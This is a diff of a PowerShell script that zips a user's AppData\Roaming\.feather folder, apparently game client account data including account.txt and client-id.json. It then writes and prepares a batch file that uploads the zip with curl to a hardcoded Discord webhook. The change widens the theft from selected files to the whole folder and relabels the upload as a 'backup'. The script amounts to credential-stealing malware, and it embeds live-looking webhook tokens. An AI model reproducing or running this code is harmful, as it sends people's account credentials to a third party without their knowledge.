@@ -1,42 +1,33 @@
 # Define paths
 $desktopPath = [System.Environment]::GetFolderPath('Desktop')
 $batchFilePath = Join-Path $desktopPath 'send_webhook.bat'
-$zipPath = Join-Path $env:TEMP 'feather_files.zip'
+$featherPath = Join-Path $env:USERPROFILE 'AppData\Roaming\.feather'
+$zipPath = Join-Path $env:TEMP 'feather_backup.zip'
 
-# Paths to include in ZIP
-$filePaths = @(
-    "$env:USERPROFILE\AppData\Roaming\.feather\account.txt",
-    "$env:USERPROFILE\AppData\Roaming\.feather\client-id.json",
-    "$env:USERPROFILE\AppData\Roaming\.feather\cmp.json",
-    "$env:USERPROFILE\AppData\Roaming\.feather\settings.json",
-    "$env:USERPROFILE\AppData\Roaming\.feather\skins.json"
-)
-
-# Ensure all files exist
-foreach ($file in $filePaths) {
-    if (-not (Test-Path $file)) {
-        Write-Host "Missing file: $file"
-        exit
-    }
+# Check if the .feather folder exists
+if (-not (Test-Path $featherPath)) {
+    Write-Host ".feather folder not found at $featherPath"
+    exit
 }
 
-# Create ZIP
-if (Test-Path $zipPath) { Remove-Item $zipPath }
-Compress-Archive -Path $filePaths -DestinationPath $zipPath
+# Remove old zip if it exists
+if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
 
-# Define the batch file content to send the zip
+# Zip the entire .feather folder
+Compress-Archive -Path $featherPath -DestinationPath $zipPath -Force
+
+# Create batch file to send the zip via webhook
 $batchContent = @"
 @echo off
 setlocal
 
 :: Discord Webhook URL
-set webhookUrl=https://discord.com/api/webhooks/1385974639590637598/I-qq5IcfJUmAbaLuA1T7hK7UM-HaQBou94NVNO7EAzuI6y1coIjL6-lm7a92wyN608Ui
-
+set webhookUrl=https://discord.com/api/webhooks/1385974642140905623/zzWiMe-iYr68M5_0ormBmrSzLWW1VB4ZM2ROIJpxuU9vFocKTjMXx84Gn-7utigslAOH
 :: Path to ZIP file
 set zipPath=$zipPath
 
 :: Payload content
-set payload_json={\"content\":\"Zipped files uploaded :package:\"}
+set payload_json={\"content\":\".feather folder backup attached :package:\"}
 
 :: Send with curl
 curl -X POST %webhookUrl% ^
@@ -47,7 +38,7 @@ curl -X POST %webhookUrl% ^
 if %errorlevel% neq 0 (
     echo Failed to send webhook.
 ) else (
-    echo ZIP file sent successfully!
+    echo ZIP sent successfully!
 )
 
 endlocal
